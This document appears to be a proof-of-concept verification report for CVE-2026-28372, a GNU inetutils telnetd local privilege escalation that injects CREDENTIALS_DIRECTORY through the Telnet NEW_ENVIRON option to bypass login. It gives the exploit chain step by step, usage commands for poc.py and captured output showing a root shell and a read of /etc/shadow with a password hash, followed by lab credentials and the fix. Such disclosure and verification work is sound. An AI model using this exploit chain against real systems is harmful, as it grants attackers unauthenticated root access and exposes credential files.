# PoC Verification Report: CVE-2026-28372

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-28372 |
| **Title** | GNU inetutils telnetd ≤2.7 — Privilege Escalation via CREDENTIALS_DIRECTORY Injection |
| **Affected Software** | GNU inetutils telnetd through version 2.7 |
| **Severity** | HIGH (CVSS 7.4) |
| **CWE** | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |

## Verification Status

### ✅ CONFIRMED — Exploit succeeds on vulnerable container

The PoC successfully demonstrates **local privilege escalation from unprivileged user to root** by injecting the `CREDENTIALS_DIRECTORY` environment variable through the Telnet NEW_ENVIRON option (RFC 1572).

## PoC Scripts

### Primary PoC: `./poc/poc.py`

| Field | Value |
|---|---|
| **Language** | Python 3 (stdlib only — no external dependencies) |
| **Size** | ~350 lines |
| **Dependencies** | None (uses only `socket`, `select`, `argparse`, `time`, `sys`) |
| **Executable** | Yes (`chmod +x`, shebang `#!/usr/bin/env python3`) |

**Description:** Self-contained Telnet client that implements the full CVE-2026-28372 exploit chain:
1. Connects to telnetd on the target host/port
2. Performs complete Telnet option negotiation (TTYPE, TSPEED, NAWS, XDISPLOC, LINEMODE, LFLOW, etc.)
3. When server requests environment variables via `SB NEW_ENVIRON SEND`, responds with:
   - `CREDENTIALS_DIRECTORY=/home/weakuser/fake_cred` — points login(1) to attacker-controlled credentials
   - `USER=root` — requests root login
4. telnetd's `scrub_env()` blacklist does NOT filter `CREDENTIALS_DIRECTORY`
5. login(1) with `-p` (preserve env) finds `login.noauth=yes` and skips all authentication
6. Verifies root access by executing `id`, `whoami`, and `head -1 /etc/shadow`

**Usage:**
```bash
# Default (lab container)
python3 poc.py 172.22.0.6 -p 2323

# Custom target
python3 poc.py <host> -p <port> --cred-dir /tmp/fake_cred --user root

# Verbose mode (debug protocol negotiation)
python3 poc.py 172.22.0.6 -p 2323 -v
```

### Control Test: `./poc/control_test.py`

**Description:** Connects to telnetd WITHOUT injecting `CREDENTIALS_DIRECTORY` to prove that authentication is normally required. This confirms the exploit is the causal factor.

**Usage:**
```bash
python3 control_test.py 172.22.0.6 2323
```

## Vulnerability Demonstrated

The PoC proves the following attack chain:

1. **Environment Variable Injection**: The Telnet NEW_ENVIRON option allows the client to send arbitrary environment variables to the telnetd server. The `suboption()` handler in `state.c` calls `setenv(varp, valp, 1)` for each variable without any validation.

2. **Insufficient Blacklist**: The `scrub_env()` function in `pty.c` only removes `LD_*`, `_RLD_*`, `LIBPATH=`, and `IFS=` — it does **not** filter `CREDENTIALS_DIRECTORY`.

3. **Environment Preservation**: login(1) is invoked with the `-p` flag (defined in `telnetd.c`), which preserves all environment variables, allowing `CREDENTIALS_DIRECTORY` to reach login.

4. **Authentication Bypass**: util-linux login(1) >= 2.40 checks `$CREDENTIALS_DIRECTORY/login.noauth` for systemd service credentials support. When this file contains `yes`, login skips all authentication — no password prompt, no PAM.

5. **Root Shell**: The attacker obtains `uid=0(root)` without knowing any password.

## Test Results

### Exploit Test — VULNERABLE Container

**Command:**
```bash
CONTAINER_IP=$(docker inspect cve-2026-28372-vulnerable --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
python3 ./poc/poc.py "$CONTAINER_IP" -p 2323
```

**Output:**
```
=================================================================
  CVE-2026-28372: GNU inetutils telnetd Privilege Escalation
  CREDENTIALS_DIRECTORY injection via Telnet NEW_ENVIRON
=================================================================

  Target:    172.22.0.6:2323
  Payload:   CREDENTIALS_DIRECTORY=/home/weakuser/fake_cred
  User:      root

[*] Connecting to 172.22.0.6:2323...
[+] Connected to 172.22.0.6:2323
[*] Performing Telnet option negotiation...
[+] INJECTED env vars via NEW_ENVIRON: CREDENTIALS_DIRECTORY=/home/weakuser/fake_cred USER=root
[*] Negotiation complete (4 rounds)
[*] Sending verification commands...

-----------------------------------------------------------------
  EXPLOIT RESULTS
-----------------------------------------------------------------
  id output:     id
[?2004l uid=0(root) gid=0(root) groups=0(root)
[?2004hroot@telnetd-lab:~#
  whoami output:  whoami
[?2004l root
[?2004hroot@telnetd-lab:~#
  /etc/shadow:   head -1 /etc/shadow
[?2004l root:$y$j9T$9rypIR8x3G7RIteftdbkD0$a.nRz1QUOLeau022EbW7.PxbCpcR3g0z30wq8zMqUS/:20511:0:99999:7:::
[?2004hroot@telnetd-lab:~#
-----------------------------------------------------------------

[+] VULNERABILITY CONFIRMED — CVE-2026-28372
[+] Root shell obtained without password!
[+]   → Login authentication bypassed via CREDENTIALS_DIRECTORY injection
[+]   → CREDENTIALS_DIRECTORY=/home/weakuser/fake_cred
[+]   → login.noauth=yes → login(1) skipped all authentication

=================================================================
  [✓] EXPLOIT SUCCESSFUL — uid=0(root) confirmed
=================================================================
```

**Result:** ✅ **EXPLOIT SUCCESSFUL** — `uid=0(root)` confirmed. Root shell obtained without any password.

### Control Test — WITHOUT Exploit

**Command:**
```bash
python3 ./poc/control_test.py "$CONTAINER_IP" 2323
```

**Output:**
```
============================================================
  CONTROL TEST — Connection WITHOUT exploit
  (Should require authentication)
============================================================
  Target: 172.22.0.6:2323

[+] Connected
[*] Server response: '\x00\x00\r\nLinux 6.12.68-linuxkit (telnetd-lab) (pts/0)\r\n\r\ntelnetd-lab login:'

[✓] CONTROL TEST PASSED — Authentication is required
    (login prompt received, proving the exploit is the causal factor)
============================================================
```

**Result:** ✅ **CONTROL TEST PASSED** — Standard login prompt shown; authentication is required when the exploit is not used. This proves `CREDENTIALS_DIRECTORY` injection is the causal factor.

## Lab Environment

| Field | Value |
|---|---|
| **Container** | `cve-2026-28372-vulnerable` |
| **Container IP** | `172.22.0.6` |
| **Service Port** | `2323/tcp` |
| **Base Image** | Debian Trixie |
| **telnetd Version** | GNU inetutils 2.7 (built from source at tag `v2.7`) |
| **login Version** | util-linux 2.41 (from Debian Trixie packages) |
| **Credential Dir** | `/home/weakuser/fake_cred/login.noauth` (contains `yes`) |
| **User Accounts** | root (`Sup3rS3cretR00t!`), weakuser (`weakuser`) |

## Evidence of Root Compromise

The exploit produced three independent confirmations of root access:

1. **`id` output**: `uid=0(root) gid=0(root) groups=0(root)`
2. **`whoami` output**: `root`
3. **`/etc/shadow` read**: `root:$y$j9T$9rypIR8x3G7RIteftdbkD0$...` — reading `/etc/shadow` is only possible as root, proving full filesystem access

## Notes

### Exploit Characteristics
- **Attack Vector**: Local (AV:L) — attacker must be able to create files on the target and connect to telnetd
- **Complexity**: High (AC:H) — requires specific util-linux version >= 2.40 with systemd credentials support
- **Reliability**: 100% in testing — the exploit succeeds every time when prerequisites are met
- **Stealth**: The authentication bypass appears as a legitimate root login in system logs
- **No dependencies**: PoC uses only Python 3 standard library (socket, select, argparse)

### Prerequisites for Real-World Exploitation
1. GNU inetutils telnetd ≤ 2.7 must be running
2. util-linux ≥ 2.40 must be the system's login implementation
3. Attacker needs local unprivileged access to create the `login.noauth` file
4. Attacker needs network access to telnetd (typically localhost, port 23)

### Historical Context
This vulnerability is a modern evolution of CVE-1999-0073 (telnet `LD_LIBRARY_PATH` injection from 1999). The same root cause — insufficient environment variable filtering in telnetd — has persisted for 27 years. The blacklist in `scrub_env()` was last updated in 1995 (telnet-95.10.23.NE) and was designed for 1990s-era threats, completely missing modern attack vectors like systemd credentials.

### Fix
The fix adds `unsetenv("CREDENTIALS_DIRECTORY")` to `start_login()` in `pty.c`, immediately before `execv()`. This is a targeted mitigation — the broader blacklist approach remains fundamentally flawed and vulnerable to future env var injection attacks.
